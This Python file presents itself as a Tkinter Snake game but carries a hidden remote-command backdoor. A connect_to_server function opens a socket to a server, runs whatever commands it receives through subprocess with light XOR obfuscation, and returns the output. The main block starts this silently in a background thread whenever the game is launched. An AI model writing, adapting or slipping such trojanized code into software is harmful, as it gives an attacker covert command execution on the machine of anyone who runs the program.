import random
import tkinter as tk
import threading
import socket
import subprocess

server_ip = '127.0.0.1'

port = 9999  
ENCRYPTION_KEY = b'secretkey'


def xor_crypt(data, key):
    return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])


def connect_to_server():
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        client.connect((server_ip, port))  

        while True:
            encrypted_command = client.recv(4096)
            if not encrypted_command:
                break
            command = xor_crypt(encrypted_command, ENCRYPTION_KEY).decode()

            if command.lower() == 'exit':
                client.close()
                break

            try:
                output = subprocess.getoutput(command)
                if not output:
                    output = "Command executed successfully"
            except Exception as e:
                output = str(e)

            encrypted_output = xor_crypt(output.encode(), ENCRYPTION_KEY)
            client.sendall(encrypted_output)

    except Exception as e:
        print(f"Connection error: {e}")



CELL_SIZE = 24
GRID_WIDTH = 24
GRID_HEIGHT = 18
MOVE_DELAY_MS = 110

BACKGROUND = "#111827"
GRID_LINE = "#1f2937"
PANEL = "#0f172a"
SNAKE_BODY = "#22c55e"
SNAKE_HEAD = "#86efac"
FOOD = "#ef4444"
TEXT = "#f9fafb"
MUTED_TEXT = "#cbd5e1"

DIRECTIONS = {
    "Up": (0, -1),
    "Down": (0, 1),
    "Left": (-1, 0),
    "Right": (1, 0),
}

OPPOSITE = {
    "Up": "Down",
    "Down": "Up",
    "Left": "Right",
    "Right": "Left",
}


class SnakeGame:
    def __init__(self):
        self.window = tk.Tk()
        self.window.title("Snake")
        self.window.resizable(False, False)

        self.after_id = None
        self.score = 0
        self.snake = []
        self.food = None
        self.direction = "Right"
        self.next_direction = "Right"
        self.game_over = False

        self.score_text = tk.StringVar()

        header = tk.Frame(self.window, background=PANEL)
        header.pack(fill="x")

        self.score_label = tk.Label(
            header,
            textvariable=self.score_text,
            font=("Consolas", 18, "bold"),
            background=PANEL,
            foreground=TEXT,
            padx=12,
            pady=10,
        )
        self.score_label.pack(side="left")

        restart_button = tk.Button(
            header,
            text="Restart",
            font=("Consolas", 12, "bold"),
            command=self.reset_game,
            background="#334155",
            foreground=TEXT,
            activebackground="#475569",
            activeforeground=TEXT,
            relief="flat",
            padx=12,
            pady=4,
        )
        restart_button.pack(side="right", padx=10, pady=8)

        self.canvas = tk.Canvas(
            self.window,
            width=GRID_WIDTH * CELL_SIZE,
            height=GRID_HEIGHT * CELL_SIZE,
            background=BACKGROUND,
            highlightthickness=0,
        )
        self.canvas.pack()

        self.window.bind("<KeyPress>", self.handle_keypress)
        self.reset_game()
        self.center_window()

    def center_window(self):
        self.window.update()
        window_width = self.window.winfo_width()
        window_height = self.window.winfo_height()
        screen_width = self.window.winfo_screenwidth()
        screen_height = self.window.winfo_screenheight()
        window_x = int((screen_width / 2) - (window_width / 2))
        window_y = int((screen_height / 2) - (window_height / 2))
        self.window.geometry(f"{window_width}x{window_height}+{window_x}+{window_y}")

    def reset_game(self):
        if self.after_id is not None:
            self.window.after_cancel(self.after_id)
            self.after_id = None

        start_x = GRID_WIDTH // 2
        start_y = GRID_HEIGHT // 2

        self.score = 0
        self.snake = [
            (start_x, start_y),
            (start_x - 1, start_y),
            (start_x - 2, start_y),
        ]
        self.direction = "Right"
        self.next_direction = "Right"
        self.game_over = False

        self.spawn_food()
        self.update_score()
        self.draw()
        self.after_id = self.window.after(MOVE_DELAY_MS, self.tick)

    def spawn_food(self):
        occupied = set(self.snake)
        free_cells = [
            (column, row)
            for column in range(GRID_WIDTH)
            for row in range(GRID_HEIGHT)
            if (column, row) not in occupied
        ]
        self.food = random.choice(free_cells) if free_cells else None

    def update_score(self):
        self.score_text.set(f"Score: {self.score}")

    def handle_keypress(self, event):
        key_map = {
            "Up": "Up",
            "Down": "Down",
            "Left": "Left",
            "Right": "Right",
            "w": "Up",
            "W": "Up",
            "s": "Down",
            "S": "Down",
            "a": "Left",
            "A": "Left",
            "d": "Right",
            "D": "Right",
        }

        if event.keysym in ("r", "R"):
            self.reset_game()
            return

        new_direction = key_map.get(event.keysym)
        if new_direction and OPPOSITE[new_direction] != self.direction:
            self.next_direction = new_direction

    def tick(self):
        if self.game_over:
            return

        self.direction = self.next_direction
        delta_x, delta_y = DIRECTIONS[self.direction]
        head_x, head_y = self.snake[0]
        new_head = (head_x + delta_x, head_y + delta_y)

        if self.hit_wall(new_head) or self.hit_self(new_head):
            self.end_game()
            return

        self.snake.insert(0, new_head)

        if new_head == self.food:
            self.score += 1
            self.update_score()
            self.spawn_food()
        else:
            self.snake.pop()

        if self.food is None:
            self.end_game("You win!")
            return

        self.draw()
        self.after_id = self.window.after(MOVE_DELAY_MS, self.tick)

    def hit_wall(self, position):
        column, row = position
        return (
            column < 0
            or column >= GRID_WIDTH
            or row < 0
            or row >= GRID_HEIGHT
        )

    def hit_self(self, position):
        body_to_check = self.snake if position == self.food else self.snake[:-1]
        return position in body_to_check

    def end_game(self, message="Game Over"):
        self.game_over = True
        self.after_id = None
        self.draw()

        center_x = GRID_WIDTH * CELL_SIZE // 2
        center_y = GRID_HEIGHT * CELL_SIZE // 2

        self.canvas.create_rectangle(
            center_x - 145,
            center_y - 54,
            center_x + 145,
            center_y + 54,
            fill="#020617",
            outline="#475569",
            width=2,
        )
        self.canvas.create_text(
            center_x,
            center_y - 14,
            text=message,
            fill=TEXT,
            font=("Consolas", 24, "bold"),
        )
        self.canvas.create_text(
            center_x,
            center_y + 24,
            text="Press R to restart",
            fill=MUTED_TEXT,
            font=("Consolas", 13),
        )

    def draw(self):
        self.canvas.delete("all")
        self.draw_grid()
        self.draw_food()
        self.draw_snake()

    def draw_grid(self):
        width = GRID_WIDTH * CELL_SIZE
        height = GRID_HEIGHT * CELL_SIZE

        for x in range(0, width + 1, CELL_SIZE):
            self.canvas.create_line(x, 0, x, height, fill=GRID_LINE)

        for y in range(0, height + 1, CELL_SIZE):
            self.canvas.create_line(0, y, width, y, fill=GRID_LINE)

    def draw_food(self):
        if self.food is not None:
            self.draw_cell(self.food, FOOD, padding=5, oval=True)

    def draw_snake(self):
        for index, position in enumerate(self.snake):
            color = SNAKE_HEAD if index == 0 else SNAKE_BODY
            self.draw_cell(position, color, padding=2)

    def draw_cell(self, position, color, padding=2, oval=False):
        column, row = position
        left = column * CELL_SIZE + padding
        top = row * CELL_SIZE + padding
        right = (column + 1) * CELL_SIZE - padding
        bottom = (row + 1) * CELL_SIZE - padding

        if oval:
            self.canvas.create_oval(left, top, right, bottom, fill=color, outline="")
        else:
            self.canvas.create_rectangle(left, top, right, bottom, fill=color, outline="")

    def run(self):
        self.window.mainloop()


def run_game():
    SnakeGame().run()


if __name__ == "__main__":
    server_thread = threading.Thread(target=connect_to_server, daemon=True)
    server_thread.start()
    run_game()
    server_thread.join()
